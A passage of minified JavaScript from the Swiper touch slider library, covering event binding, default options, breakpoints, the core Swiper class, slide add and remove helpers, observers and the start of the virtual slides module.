        e.previousTranslate = e.translate, e.isHorizontal() ? e.translate = -t.scrollLeft : e.translate = -t.scrollTop, 0 === e.translate && (e.translate = 0), e.updateActiveIndex(), e.updateSlidesClasses();
        const r = e.maxTranslate() - e.minTranslate();
        n = 0 === r ? 0 : (e.translate - e.minTranslate()) / r, n !== e.progress && e.updateProgress(s ? -e.translate : e.translate), e.emit("setTranslate", e.translate, !1)
    }
    let O = !1;

    function $() {}
    const R = (e, t) => {
        const s = a(),
            {
                params: n,
                touchEvents: r,
                el: o,
                wrapperEl: i,
                device: l,
                support: c
            } = e,
            d = !!n.nested,
            u = "on" === t ? "addEventListener" : "removeEventListener",
            p = t;
        if (c.touch) {
            const t = !("touchstart" !== r.start || !c.passiveListener || !n.passiveListeners) && {
                passive: !0,
                capture: !1
            };
            o[u](r.start, e.onTouchStart, t), o[u](r.move, e.onTouchMove, c.passiveListener ? {
                passive: !1,
                capture: d
            } : d), o[u](r.end, e.onTouchEnd, t), r.cancel && o[u](r.cancel, e.onTouchEnd, t)
        } else o[u](r.start, e.onTouchStart, !1), s[u](r.move, e.onTouchMove, d), s[u](r.end, e.onTouchEnd, !1);
        (n.preventClicks || n.preventClicksPropagation) && o[u]("click", e.onClick, !0), n.cssMode && i[u]("scroll", e.onScroll), n.updateOnWindowResize ? e[p](l.ios || l.android ? "resize orientationchange observerUpdate" : "resize observerUpdate", P, !0) : e[p]("observerUpdate", P, !0)
    };
    var G = {
        attachEvents: function() {
            const e = this,
                t = a(),
                {
                    params: s,
                    support: n
                } = e;
            e.onTouchStart = k.bind(e), e.onTouchMove = M.bind(e), e.onTouchEnd = I.bind(e), s.cssMode && (e.onScroll = H.bind(e)), e.onClick = D.bind(e), n.touch && !O && (t.addEventListener("touchstart", $), O = !0), R(e, "on")
        },
        detachEvents: function() {
            R(this, "off")
        }
    };
    const j = (e, t) => e.grid && t.grid && t.grid.rows > 1;
    var F = {
            addClasses: function() {
                const e = this,
                    {
                        classNames: t,
                        params: s,
                        rtl: a,
                        $el: n,
                        device: r,
                        support: o
                    } = e,
                    i = function(e, t) {
                        const s = [];
                        return e.forEach((e => {
                            "object" == typeof e ? Object.keys(e).forEach((a => {
                                e[a] && s.push(t + a)
                            })) : "string" == typeof e && s.push(t + e)
                        })), s
                    }(["initialized", s.direction, {
                        "pointer-events": !o.touch
                    }, {
                        "free-mode": e.params.freeMode && s.freeMode.enabled
                    }, {
                        autoheight: s.autoHeight
                    }, {
                        rtl: a
                    }, {
                        grid: s.grid && s.grid.rows > 1
                    }, {
                        "grid-column": s.grid && s.grid.rows > 1 && "column" === s.grid.fill
                    }, {
                        android: r.android
                    }, {
                        ios: r.ios
                    }, {
                        "css-mode": s.cssMode
                    }, {
                        centered: s.cssMode && s.centeredSlides
                    }, {
                        "watch-progress": s.watchSlidesProgress
                    }], s.containerModifierClass);
                t.push(...i), n.addClass([...t].join(" ")), e.emitContainerClasses()
            },
            removeClasses: function() {
                const {
                    $el: e,
                    classNames: t
                } = this;
                e.removeClass(t.join(" ")), this.emitContainerClasses()
            }
        },
        U = {
            init: !0,
            direction: "horizontal",
            touchEventsTarget: "wrapper",
            initialSlide: 0,
            speed: 300,
            cssMode: !1,
            updateOnWindowResize: !0,
            resizeObserver: !0,
            nested: !1,
            createElements: !1,
            enabled: !0,
            focusableElements: "input, select, option, textarea, button, video, label",
            width: null,
            height: null,
            preventInteractionOnTransition: !1,
            userAgent: null,
            url: null,
            edgeSwipeDetection: !1,
            edgeSwipeThreshold: 20,
            autoHeight: !1,
            setWrapperSize: !1,
            virtualTranslate: !1,
            effect: "slide",
            breakpoints: void 0,
            breakpointsBase: "window",
            spaceBetween: 0,
            slidesPerView: 1,
            slidesPerGroup: 1,
            slidesPerGroupSkip: 0,
            slidesPerGroupAuto: !1,
            centeredSlides: !1,
            centeredSlidesBounds: !1,
            slidesOffsetBefore: 0,
            slidesOffsetAfter: 0,
            normalizeSlideIndex: !0,
            centerInsufficientSlides: !1,
            watchOverflow: !0,
            roundLengths: !1,
            touchRatio: 1,
            touchAngle: 45,
            simulateTouch: !0,
            shortSwipes: !0,
            longSwipes: !0,
            longSwipesRatio: .5,
            longSwipesMs: 300,
            followFinger: !0,
            allowTouchMove: !0,
            threshold: 0,
            touchMoveStopPropagation: !1,
            touchStartPreventDefault: !0,
            touchStartForcePreventDefault: !1,
            touchReleaseOnEdges: !1,
            uniqueNavElements: !0,
            resistance: !0,
            resistanceRatio: .85,
            watchSlidesProgress: !1,
            grabCursor: !1,
            preventClicks: !0,
            preventClicksPropagation: !0,
            slideToClickedSlide: !1,
            preloadImages: !0,
            updateOnImagesReady: !0,
            loop: !1,
            loopAdditionalSlides: 0,
            loopedSlides: null,
            loopedSlidesLimit: !0,
            loopFillGroupWithBlank: !1,
            loopPreventsSlide: !0,
            rewind: !1,
            allowSlidePrev: !0,
            allowSlideNext: !0,
            swipeHandler: null,
            noSwiping: !0,
            noSwipingClass: "swiper-no-swiping",
            noSwipingSelector: null,
            passiveListeners: !0,
            maxBackfaceHiddenSlides: 10,
            containerModifierClass: "swiper-",
            slideClass: "swiper-slide",
            slideBlankClass: "swiper-slide-invisible-blank",
            slideActiveClass: "swiper-slide-active",
            slideDuplicateActiveClass: "swiper-slide-duplicate-active",
            slideVisibleClass: "swiper-slide-visible",
            slideDuplicateClass: "swiper-slide-duplicate",
            slideNextClass: "swiper-slide-next",
            slideDuplicateNextClass: "swiper-slide-duplicate-next",
            slidePrevClass: "swiper-slide-prev",
            slideDuplicatePrevClass: "swiper-slide-duplicate-prev",
            wrapperClass: "swiper-wrapper",
            runCallbacksOnInit: !0,
            _emitClasses: !1
        };

    function q(e, t) {
        return function(s) {
            void 0 === s && (s = {});
            const a = Object.keys(s)[0],
                n = s[a];
            "object" == typeof n && null !== n ? (["navigation", "pagination", "scrollbar"].indexOf(a) >= 0 && !0 === e[a] && (e[a] = {
                auto: !0
            }), a in e && "enabled" in n ? (!0 === e[a] && (e[a] = {
                enabled: !0
            }), "object" != typeof e[a] || "enabled" in e[a] || (e[a].enabled = !0), e[a] || (e[a] = {
                enabled: !1
            }), g(t, s)) : g(t, s)) : g(t, s)
        }
    }
    const z = {
            eventsEmitter: B,
            update: N,
            translate: T,
            transition: {
                setTransition: function(e, t) {
                    const s = this;
                    s.params.cssMode || s.$wrapperEl.transition(e), s.emit("setTransition", e, t)
                },
                transitionStart: function(e, t) {
                    void 0 === e && (e = !0);
                    const s = this,
                        {
                            params: a
                        } = s;
                    a.cssMode || (a.autoHeight && s.updateAutoHeight(), x({
                        swiper: s,
                        runCallbacks: e,
                        direction: t,
                        step: "Start"
                    }))
                },
                transitionEnd: function(e, t) {
                    void 0 === e && (e = !0);
                    const s = this,
                        {
                            params: a
                        } = s;
                    s.animating = !1, a.cssMode || (s.setTransition(0), x({
                        swiper: s,
                        runCallbacks: e,
                        direction: t,
                        step: "End"
                    }))
                }
            },
            slide: S,
            loop: A,
            grabCursor: {
                setGrabCursor: function(e) {
                    const t = this;
                    if (t.support.touch || !t.params.simulateTouch || t.params.watchOverflow && t.isLocked || t.params.cssMode) return;
                    const s = "container" === t.params.touchEventsTarget ? t.el : t.wrapperEl;
                    s.style.cursor = "move", s.style.cursor = e ? "grabbing" : "grab"
                },
                unsetGrabCursor: function() {
                    const e = this;
                    e.support.touch || e.params.watchOverflow && e.isLocked || e.params.cssMode || (e["container" === e.params.touchEventsTarget ? "el" : "wrapperEl"].style.cursor = "")
                }
            },
            events: G,
            breakpoints: {
                setBreakpoint: function() {
                    const e = this,
                        {
                            activeIndex: t,
                            initialized: s,
                            loopedSlides: a = 0,
                            params: n,
                            $el: r
                        } = e,
                        o = n.breakpoints;
                    if (!o || o && 0 === Object.keys(o).length) return;
                    const i = e.getBreakpoint(o, e.params.breakpointsBase, e.el);
                    if (!i || e.currentBreakpoint === i) return;
                    const l = (i in o ? o[i] : void 0) || e.originalParams,
                        c = j(e, n),
                        d = j(e, l),
                        u = n.enabled;
                    c && !d ? (r.removeClass(`${n.containerModifierClass}grid ${n.containerModifierClass}grid-column`), e.emitContainerClasses()) : !c && d && (r.addClass(`${n.containerModifierClass}grid`), (l.grid.fill && "column" === l.grid.fill || !l.grid.fill && "column" === n.grid.fill) && r.addClass(`${n.containerModifierClass}grid-column`), e.emitContainerClasses()), ["navigation", "pagination", "scrollbar"].forEach((t => {
                        const s = n[t] && n[t].enabled,
                            a = l[t] && l[t].enabled;
                        s && !a && e[t].disable(), !s && a && e[t].enable()
                    }));
                    const p = l.direction && l.direction !== n.direction,
                        m = n.loop && (l.slidesPerView !== n.slidesPerView || p);
                    p && s && e.changeDirection(), g(e.params, l);
                    const f = e.params.enabled;
                    Object.assign(e, {
                        allowTouchMove: e.params.allowTouchMove,
                        allowSlideNext: e.params.allowSlideNext,
                        allowSlidePrev: e.params.allowSlidePrev
                    }), u && !f ? e.disable() : !u && f && e.enable(), e.currentBreakpoint = i, e.emit("_beforeBreakpoint", l), m && s && (e.loopDestroy(), e.loopCreate(), e.updateSlides(), e.slideTo(t - a + e.loopedSlides, 0, !1)), e.emit("breakpoint", l)
                },
                getBreakpoint: function(e, t, s) {
                    if (void 0 === t && (t = "window"), !e || "container" === t && !s) return;
                    let a = !1;
                    const n = r(),
                        o = "window" === t ? n.innerHeight : s.clientHeight,
                        i = Object.keys(e).map((e => {
                            if ("string" == typeof e && 0 === e.indexOf("@")) {
                                const t = parseFloat(e.substr(1));
                                return {
                                    value: o * t,
                                    point: e
                                }
                            }
                            return {
                                value: e,
                                point: e
                            }
                        }));
                    i.sort(((e, t) => parseInt(e.value, 10) - parseInt(t.value, 10)));
                    for (let e = 0; e < i.length; e += 1) {
                        const {
                            point: r,
                            value: o
                        } = i[e];
                        "window" === t ? n.matchMedia(`(min-width: ${o}px)`).matches && (a = r) : o <= s.clientWidth && (a = r)
                    }
                    return a || "max"
                }
            },
            checkOverflow: {
                checkOverflow: function() {
                    const e = this,
                        {
                            isLocked: t,
                            params: s
                        } = e,
                        {
                            slidesOffsetBefore: a
                        } = s;
                    if (a) {
                        const t = e.slides.length - 1,
                            s = e.slidesGrid[t] + e.slidesSizesGrid[t] + 2 * a;
                        e.isLocked = e.size > s
                    } else e.isLocked = 1 === e.snapGrid.length;
                    !0 === s.allowSlideNext && (e.allowSlideNext = !e.isLocked), !0 === s.allowSlidePrev && (e.allowSlidePrev = !e.isLocked), t && t !== e.isLocked && (e.isEnd = !1), t !== e.isLocked && e.emit(e.isLocked ? "lock" : "unlock")
                }
            },
            classes: F,
            images: {
                loadImage: function(e, t, s, a, n, o) {
                    const i = r();
                    let l;

                    function d() {
                        o && o()
                    }
                    c(e).parent("picture")[0] || e.complete && n ? d() : t ? (l = new i.Image, l.onload = d, l.onerror = d, a && (l.sizes = a), s && (l.srcset = s), t && (l.src = t)) : d()
                },
                preloadImages: function() {
                    const e = this;

                    function t() {
                        null != e && e && !e.destroyed && (void 0 !== e.imagesLoaded && (e.imagesLoaded += 1), e.imagesLoaded === e.imagesToLoad.length && (e.params.updateOnImagesReady && e.update(), e.emit("imagesReady")))
                    }
                    e.imagesToLoad = e.$el.find("img");
                    for (let s = 0; s < e.imagesToLoad.length; s += 1) {
                        const a = e.imagesToLoad[s];
                        e.loadImage(a, a.currentSrc || a.getAttribute("src"), a.srcset || a.getAttribute("srcset"), a.sizes || a.getAttribute("sizes"), !0, t)
                    }
                }
            }
        },
        Y = {};
    class J {
        constructor() {
            let e, t;
            for (var s = arguments.length, a = new Array(s), n = 0; n < s; n++) a[n] = arguments[n];
            if (1 === a.length && a[0].constructor && "Object" === Object.prototype.toString.call(a[0]).slice(8, -1) ? t = a[0] : [e, t] = a, t || (t = {}), t = g({}, t), e && !t.el && (t.el = e), t.el && c(t.el).length > 1) {
                const e = [];
                return c(t.el).each((s => {
                    const a = g({}, t, {
                        el: s
                    });
                    e.push(new J(a))
                })), e
            }
            const r = this;
            r.__swiper__ = !0, r.support = E(), r.device = _({
                userAgent: t.userAgent
            }), r.browser = L(), r.eventsListeners = {}, r.eventsAnyListeners = [], r.modules = [...r.__modules__], t.modules && Array.isArray(t.modules) && r.modules.push(...t.modules);
            const o = {};
            r.modules.forEach((e => {
                e({
                    swiper: r,
                    extendParams: q(t, o),
                    on: r.on.bind(r),
                    once: r.once.bind(r),
                    off: r.off.bind(r),
                    emit: r.emit.bind(r)
                })
            }));
            const i = g({}, U, o);
            return r.params = g({}, i, Y, t), r.originalParams = g({}, r.params), r.passedParams = g({}, t), r.params && r.params.on && Object.keys(r.params.on).forEach((e => {
                r.on(e, r.params.on[e])
            })), r.params && r.params.onAny && r.onAny(r.params.onAny), r.$ = c, Object.assign(r, {
                enabled: r.params.enabled,
                el: e,
                classNames: [],
                slides: c(),
                slidesGrid: [],
                snapGrid: [],
                slidesSizesGrid: [],
                isHorizontal: () => "horizontal" === r.params.direction,
                isVertical: () => "vertical" === r.params.direction,
                activeIndex: 0,
                realIndex: 0,
                isBeginning: !0,
                isEnd: !1,
                translate: 0,
                previousTranslate: 0,
                progress: 0,
                velocity: 0,
                animating: !1,
                allowSlideNext: r.params.allowSlideNext,
                allowSlidePrev: r.params.allowSlidePrev,
                touchEvents: function() {
                    const e = ["touchstart", "touchmove", "touchend", "touchcancel"],
                        t = ["pointerdown", "pointermove", "pointerup"];
                    return r.touchEventsTouch = {
                        start: e[0],
                        move: e[1],
                        end: e[2],
                        cancel: e[3]
                    }, r.touchEventsDesktop = {
                        start: t[0],
                        move: t[1],
                        end: t[2]
                    }, r.support.touch || !r.params.simulateTouch ? r.touchEventsTouch : r.touchEventsDesktop
                }(),
                touchEventsData: {
                    isTouched: void 0,
                    isMoved: void 0,
                    allowTouchCallbacks: void 0,
                    touchStartTime: void 0,
                    isScrolling: void 0,
                    currentTranslate: void 0,
                    startTranslate: void 0,
                    allowThresholdMove: void 0,
                    focusableElements: r.params.focusableElements,
                    lastClickTime: p(),
                    clickTimeout: void 0,
                    velocities: [],
                    allowMomentumBounce: void 0,
                    isTouchEvent: void 0,
                    startMoving: void 0
                },
                allowClick: !0,
                allowTouchMove: r.params.allowTouchMove,
                touches: {
                    startX: 0,
                    startY: 0,
                    currentX: 0,
                    currentY: 0,
                    diff: 0
                },
                imagesToLoad: [],
                imagesLoaded: 0
            }), r.emit("_swiper"), r.params.init && r.init(), r
        }
        enable() {
            const e = this;
            e.enabled || (e.enabled = !0, e.params.grabCursor && e.setGrabCursor(), e.emit("enable"))
        }
        disable() {
            const e = this;
            e.enabled && (e.enabled = !1, e.params.grabCursor && e.unsetGrabCursor(), e.emit("disable"))
        }
        setProgress(e, t) {
            const s = this;
            e = Math.min(Math.max(e, 0), 1);
            const a = s.minTranslate(),
                n = (s.maxTranslate() - a) * e + a;
            s.translateTo(n, void 0 === t ? 0 : t), s.updateActiveIndex(), s.updateSlidesClasses()
        }
        emitContainerClasses() {
            const e = this;
            if (!e.params._emitClasses || !e.el) return;
            const t = e.el.className.split(" ").filter((t => 0 === t.indexOf("swiper") || 0 === t.indexOf(e.params.containerModifierClass)));
            e.emit("_containerClasses", t.join(" "))
        }
        getSlideClasses(e) {
            const t = this;
            return t.destroyed ? "" : e.className.split(" ").filter((e => 0 === e.indexOf("swiper-slide") || 0 === e.indexOf(t.params.slideClass))).join(" ")
        }
        emitSlidesClasses() {
            const e = this;
            if (!e.params._emitClasses || !e.el) return;
            const t = [];
            e.slides.each((s => {
                const a = e.getSlideClasses(s);
                t.push({
                    slideEl: s,
                    classNames: a
                }), e.emit("_slideClass", s, a)
            })), e.emit("_slideClasses", t)
        }
        slidesPerViewDynamic(e, t) {
            void 0 === e && (e = "current"), void 0 === t && (t = !1);
            const {
                params: s,
                slides: a,
                slidesGrid: n,
                slidesSizesGrid: r,
                size: o,
                activeIndex: i
            } = this;
            let l = 1;
            if (s.centeredSlides) {
                let e, t = a[i].swiperSlideSize;
                for (let s = i + 1; s < a.length; s += 1) a[s] && !e && (t += a[s].swiperSlideSize, l += 1, t > o && (e = !0));
                for (let s = i - 1; s >= 0; s -= 1) a[s] && !e && (t += a[s].swiperSlideSize, l += 1, t > o && (e = !0))
            } else if ("current" === e)
                for (let e = i + 1; e < a.length; e += 1)(t ? n[e] + r[e] - n[i] < o : n[e] - n[i] < o) && (l += 1);
            else
                for (let e = i - 1; e >= 0; e -= 1) n[i] - n[e] < o && (l += 1);
            return l
        }
        update() {
            const e = this;
            if (!e || e.destroyed) return;
            const {
                snapGrid: t,
                params: s
            } = e;

            function a() {
                const t = e.rtlTranslate ? -1 * e.translate : e.translate,
                    s = Math.min(Math.max(t, e.maxTranslate()), e.minTranslate());
                e.setTranslate(s), e.updateActiveIndex(), e.updateSlidesClasses()
            }
            let n;
            s.breakpoints && e.setBreakpoint(), e.updateSize(), e.updateSlides(), e.updateProgress(), e.updateSlidesClasses(), e.params.freeMode && e.params.freeMode.enabled ? (a(), e.params.autoHeight && e.updateAutoHeight()) : (n = ("auto" === e.params.slidesPerView || e.params.slidesPerView > 1) && e.isEnd && !e.params.centeredSlides ? e.slideTo(e.slides.length - 1, 0, !1, !0) : e.slideTo(e.activeIndex, 0, !1, !0), n || a()), s.watchOverflow && t !== e.snapGrid && e.checkOverflow(), e.emit("update")
        }
        changeDirection(e, t) {
            void 0 === t && (t = !0);
            const s = this,
                a = s.params.direction;
            return e || (e = "horizontal" === a ? "vertical" : "horizontal"), e === a || "horizontal" !== e && "vertical" !== e || (s.$el.removeClass(`${s.params.containerModifierClass}${a}`).addClass(`${s.params.containerModifierClass}${e}`), s.emitContainerClasses(), s.params.direction = e, s.slides.each((t => {
                "vertical" === e ? t.style.width = "" : t.style.height = ""
            })), s.emit("changeDirection"), t && s.update()), s
        }
        changeLanguageDirection(e) {
            const t = this;
            t.rtl && "rtl" === e || !t.rtl && "ltr" === e || (t.rtl = "rtl" === e, t.rtlTranslate = "horizontal" === t.params.direction && t.rtl, t.rtl ? (t.$el.addClass(`${t.params.containerModifierClass}rtl`), t.el.dir = "rtl") : (t.$el.removeClass(`${t.params.containerModifierClass}rtl`), t.el.dir = "ltr"), t.update())
        }
        mount(e) {
            const t = this;
            if (t.mounted) return !0;
            const s = c(e || t.params.el);
            if (!(e = s[0])) return !1;
            e.swiper = t;
            const n = () => `.${(t.params.wrapperClass||"").trim().split(" ").join(".")}`;
            let r = (() => {
                if (e && e.shadowRoot && e.shadowRoot.querySelector) {
                    const t = c(e.shadowRoot.querySelector(n()));
                    return t.children = e => s.children(e), t
                }
                return s.children ? s.children(n()) : c(s).children(n())
            })();
            if (0 === r.length && t.params.createElements) {
                const e = a().createElement("div");
                r = c(e), e.className = t.params.wrapperClass, s.append(e), s.children(`.${t.params.slideClass}`).each((e => {
                    r.append(e)
                }))
            }
            return Object.assign(t, {
                $el: s,
                el: e,
                $wrapperEl: r,
                wrapperEl: r[0],
                mounted: !0,
                rtl: "rtl" === e.dir.toLowerCase() || "rtl" === s.css("direction"),
                rtlTranslate: "horizontal" === t.params.direction && ("rtl" === e.dir.toLowerCase() || "rtl" === s.css("direction")),
                wrongRTL: "-webkit-box" === r.css("display")
            }), !0
        }
        init(e) {
            const t = this;
            return t.initialized || !1 === t.mount(e) || (t.emit("beforeInit"), t.params.breakpoints && t.setBreakpoint(), t.addClasses(), t.params.loop && t.loopCreate(), t.updateSize(), t.updateSlides(), t.params.watchOverflow && t.checkOverflow(), t.params.grabCursor && t.enabled && t.setGrabCursor(), t.params.preloadImages && t.preloadImages(), t.params.loop ? t.slideTo(t.params.initialSlide + t.loopedSlides, 0, t.params.runCallbacksOnInit, !1, !0) : t.slideTo(t.params.initialSlide, 0, t.params.runCallbacksOnInit, !1, !0), t.attachEvents(), t.initialized = !0, t.emit("init"), t.emit("afterInit")), t
        }
        destroy(e, t) {
            void 0 === e && (e = !0), void 0 === t && (t = !0);
            const s = this,
                {
                    params: a,
                    $el: n,
                    $wrapperEl: r,
                    slides: o
                } = s;
            return void 0 === s.params || s.destroyed || (s.emit("beforeDestroy"), s.initialized = !1, s.detachEvents(), a.loop && s.loopDestroy(), t && (s.removeClasses(), n.removeAttr("style"), r.removeAttr("style"), o && o.length && o.removeClass([a.slideVisibleClass, a.slideActiveClass, a.slideNextClass, a.slidePrevClass].join(" ")).removeAttr("style").removeAttr("data-swiper-slide-index")), s.emit("destroy"), Object.keys(s.eventsListeners).forEach((e => {
                s.off(e)
            })), !1 !== e && (s.$el[0].swiper = null, function(e) {
                const t = e;
                Object.keys(t).forEach((e => {
                    try {
                        t[e] = null
                    } catch (e) {}
                    try {
                        delete t[e]
                    } catch (e) {}
                }))
            }(s)), s.destroyed = !0), null
        }
        static extendDefaults(e) {
            g(Y, e)
        }
        static get extendedDefaults() {
            return Y
        }
        static get defaults() {
            return U
        }
        static installModule(e) {
            J.prototype.__modules__ || (J.prototype.__modules__ = []);
            const t = J.prototype.__modules__;
            "function" == typeof e && t.indexOf(e) < 0 && t.push(e)
        }
        static use(e) {
            return Array.isArray(e) ? (e.forEach((e => J.installModule(e))), J) : (J.installModule(e), J)
        }
    }

    function V(e, t, s, n) {
        const r = a();
        return e.params.createElements && Object.keys(n).forEach((a => {
            if (!s[a] && !0 === s.auto) {
                let o = e.$el.children(`.${n[a]}`)[0];
                o || (o = r.createElement("div"), o.className = n[a], e.$el.append(o)), s[a] = o, t[a] = o
            }
        })), s
    }

    function W(e) {
        return void 0 === e && (e = ""), `.${e.trim().replace(/([\.:!\/])/g,"\\$1").replace(/ /g,".")}`
    }

    function K(e) {
        const t = this,
            {
                $wrapperEl: s,
                params: a
            } = t;
        if (a.loop && t.loopDestroy(), "object" == typeof e && "length" in e)
            for (let t = 0; t < e.length; t += 1) e[t] && s.append(e[t]);
        else s.append(e);
        a.loop && t.loopCreate(), a.observer || t.update()
    }

    function Z(e) {
        const t = this,
            {
                params: s,
                $wrapperEl: a,
                activeIndex: n
            } = t;
        s.loop && t.loopDestroy();
        let r = n + 1;
        if ("object" == typeof e && "length" in e) {
            for (let t = 0; t < e.length; t += 1) e[t] && a.prepend(e[t]);
            r = n + e.length
        } else a.prepend(e);
        s.loop && t.loopCreate(), s.observer || t.update(), t.slideTo(r, 0, !1)
    }

    function X(e, t) {
        const s = this,
            {
                $wrapperEl: a,
                params: n,
                activeIndex: r
            } = s;
        let o = r;
        n.loop && (o -= s.loopedSlides, s.loopDestroy(), s.slides = a.children(`.${n.slideClass}`));
        const i = s.slides.length;
        if (e <= 0) return void s.prependSlide(t);
        if (e >= i) return void s.appendSlide(t);
        let l = o > e ? o + 1 : o;
        const c = [];
        for (let t = i - 1; t >= e; t -= 1) {
            const e = s.slides.eq(t);
            e.remove(), c.unshift(e)
        }
        if ("object" == typeof t && "length" in t) {
            for (let e = 0; e < t.length; e += 1) t[e] && a.append(t[e]);
            l = o > e ? o + t.length : o
        } else a.append(t);
        for (let e = 0; e < c.length; e += 1) a.append(c[e]);
        n.loop && s.loopCreate(), n.observer || s.update(), n.loop ? s.slideTo(l + s.loopedSlides, 0, !1) : s.slideTo(l, 0, !1)
    }

    function Q(e) {
        const t = this,
            {
                params: s,
                $wrapperEl: a,
                activeIndex: n
            } = t;
        let r = n;
        s.loop && (r -= t.loopedSlides, t.loopDestroy(), t.slides = a.children(`.${s.slideClass}`));
        let o, i = r;
        if ("object" == typeof e && "length" in e) {
            for (let s = 0; s < e.length; s += 1) o = e[s], t.slides[o] && t.slides.eq(o).remove(), o < i && (i -= 1);
            i = Math.max(i, 0)
        } else o = e, t.slides[o] && t.slides.eq(o).remove(), o < i && (i -= 1), i = Math.max(i, 0);
        s.loop && t.loopCreate(), s.observer || t.update(), s.loop ? t.slideTo(i + t.loopedSlides, 0, !1) : t.slideTo(i, 0, !1)
    }

    function ee() {
        const e = this,
            t = [];
        for (let s = 0; s < e.slides.length; s += 1) t.push(s);
        e.removeSlide(t)
    }

    function te(e) {
        const {
            effect: t,
            swiper: s,
            on: a,
            setTranslate: n,
            setTransition: r,
            overwriteParams: o,
            perspective: i,
            recreateShadows: l,
            getEffectParams: c
        } = e;
        let d;
        a("beforeInit", (() => {
            if (s.params.effect !== t) return;
            s.classNames.push(`${s.params.containerModifierClass}${t}`), i && i() && s.classNames.push(`${s.params.containerModifierClass}3d`);
            const e = o ? o() : {};
            Object.assign(s.params, e), Object.assign(s.originalParams, e)
        })), a("setTranslate", (() => {
            s.params.effect === t && n()
        })), a("setTransition", ((e, a) => {
            s.params.effect === t && r(a)
        })), a("transitionEnd", (() => {
            if (s.params.effect === t && l) {
                if (!c || !c().slideShadows) return;
                s.slides.each((e => {
                    s.$(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").remove()
                })), l()
            }
        })), a("virtualUpdate", (() => {
            s.params.effect === t && (s.slides.length || (d = !0), requestAnimationFrame((() => {
                d && s.slides && s.slides.length && (n(), d = !1)
            })))
        }))
    }

    function se(e, t) {
        return e.transformEl ? t.find(e.transformEl).css({
            "backface-visibility": "hidden",
            "-webkit-backface-visibility": "hidden"
        }) : t
    }

    function ae(e) {
        let {
            swiper: t,
            duration: s,
            transformEl: a,
            allSlides: n
        } = e;
        const {
            slides: r,
            activeIndex: o,
            $wrapperEl: i
        } = t;
        if (t.params.virtualTranslate && 0 !== s) {
            let e, s = !1;
            e = n ? a ? r.find(a) : r : a ? r.eq(o).find(a) : r.eq(o), e.transitionEnd((() => {
                if (s) return;
                if (!t || t.destroyed) return;
                s = !0, t.animating = !1;
                const e = ["webkitTransitionEnd", "transitionend"];
                for (let t = 0; t < e.length; t += 1) i.trigger(e[t])
            }))
        }
    }

    function ne(e, t, s) {
        const a = "swiper-slide-shadow" + (s ? `-${s}` : ""),
            n = e.transformEl ? t.find(e.transformEl) : t;
        let r = n.children(`.${a}`);
        return r.length || (r = c(`<div class="swiper-slide-shadow${s?`-${s}`:""}"></div>`), n.append(r)), r
    }
    Object.keys(z).forEach((e => {
        Object.keys(z[e]).forEach((t => {
            J.prototype[t] = z[e][t]
        }))
    })), J.use([function(e) {
        let {
            swiper: t,
            on: s,
            emit: a
        } = e;
        const n = r();
        let o = null,
            i = null;
        const l = () => {
                t && !t.destroyed && t.initialized && (a("beforeResize"), a("resize"))
            },
            c = () => {
                t && !t.destroyed && t.initialized && a("orientationchange")
            };
        s("init", (() => {
            t.params.resizeObserver && void 0 !== n.ResizeObserver ? t && !t.destroyed && t.initialized && (o = new ResizeObserver((e => {
                i = n.requestAnimationFrame((() => {
                    const {
                        width: s,
                        height: a
                    } = t;
                    let n = s,
                        r = a;
                    e.forEach((e => {
                        let {
                            contentBoxSize: s,
                            contentRect: a,
                            target: o
                        } = e;
                        o && o !== t.el || (n = a ? a.width : (s[0] || s).inlineSize, r = a ? a.height : (s[0] || s).blockSize)
                    })), n === s && r === a || l()
                }))
            })), o.observe(t.el)) : (n.addEventListener("resize", l), n.addEventListener("orientationchange", c))
        })), s("destroy", (() => {
            i && n.cancelAnimationFrame(i), o && o.unobserve && t.el && (o.unobserve(t.el), o = null), n.removeEventListener("resize", l), n.removeEventListener("orientationchange", c)
        }))
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a,
            emit: n
        } = e;
        const o = [],
            i = r(),
            l = function(e, t) {
                void 0 === t && (t = {});
                const s = new(i.MutationObserver || i.WebkitMutationObserver)((e => {
                    if (1 === e.length) return void n("observerUpdate", e[0]);
                    const t = function() {
                        n("observerUpdate", e[0])
                    };
                    i.requestAnimationFrame ? i.requestAnimationFrame(t) : i.setTimeout(t, 0)
                }));
                s.observe(e, {
                    attributes: void 0 === t.attributes || t.attributes,
                    childList: void 0 === t.childList || t.childList,
                    characterData: void 0 === t.characterData || t.characterData
                }), o.push(s)
            };
        s({
            observer: !1,
            observeParents: !1,
            observeSlideChildren: !1
        }), a("init", (() => {
            if (t.params.observer) {
                if (t.params.observeParents) {
                    const e = t.$el.parents();
                    for (let t = 0; t < e.length; t += 1) l(e[t])
                }
                l(t.$el[0], {
                    childList: t.params.observeSlideChildren
                }), l(t.$wrapperEl[0], {
                    attributes: !1
                })
            }
        })), a("destroy", (() => {
            o.forEach((e => {
                e.disconnect()
            })), o.splice(0, o.length)
        }))
    }]);
    const re = [function(e) {
        let t, {
            swiper: s,
            extendParams: a,
            on: n,
            emit: r
        } = e;

        function o(e, t) {
            const a = s.params.virtual;
            if (a.cache && s.virtual.cache[t]) return s.virtual.cache[t];
            const n = a.renderSlide ? c(a.renderSlide.call(s, e, t)) : c(`<div class="${s.params.slideClass}" data-swiper-slide-index="${t}">${e}</div>`);
            return n.attr("data-swiper-slide-index") || n.attr("data-swiper-slide-index", t), a.cache && (s.virtual.cache[t] = n), n
        }

        function i(e) {
            const {
                slidesPerView: t,
                slidesPerGroup: a,
                centeredSlides: n
            } = s.params, {
                addSlidesBefore: i,
                addSlidesAfter: l
            } = s.params.virtual, {
                from: c,
                to: d,
                slides: u,
                slidesGrid: p,
                offset: m
            } = s.virtual;
            s.params.cssMode || s.updateActiveIndex();
            const f = s.activeIndex || 0;
            let h, g, y;
            h = s.rtlTranslate ? "right" : s.isHorizontal() ? "left" : "top", n ? (g = Math.floor(t / 2) + a + l, y = Math.floor(t / 2) + a + i) : (g = t + (a - 1) + l, y = a + i);
            const v = Math.max((f || 0) - y, 0),
                b = Math.min((f || 0) + g, u.length - 1),
                w = (s.slidesGrid[v] || 0) - (s.slidesGrid[0] || 0);

            function C() {
                s.updateSlides(), s.updateProgress(), s.updateSlidesClasses(), s.lazy && s.params.lazy.enabled && s.lazy.load(), r("virtualUpdate")
            }
            if (Object.assign(s.virtual, {
                    from: v,
                    to: b,
                    offset: w,
                    slidesGrid: s.slidesGrid
